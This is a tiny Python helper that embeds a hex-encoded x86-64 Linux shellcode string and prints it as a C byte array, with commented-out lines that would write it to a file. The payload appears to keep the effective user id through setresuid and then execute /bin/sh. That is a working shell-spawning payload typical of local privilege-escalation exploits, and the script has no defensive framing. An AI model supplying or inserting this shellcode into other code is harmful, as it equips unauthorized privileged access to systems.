#Shellcode in hex string ex deadbeef 
shellcode = "6a6b580f0589c789c289c66a75580f056a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05"
sc_bytes = bytes.fromhex(shellcode)

# Print is for a C Program
c_array = ', '.join([f'0x{byte:02x}' for byte in sc_bytes])
print('unsigned char shellcode[] = { ' + c_array + ' };')

# Write it out to a file
#f = open("shellcode.out","wb")
#f.write(sc_bytes)

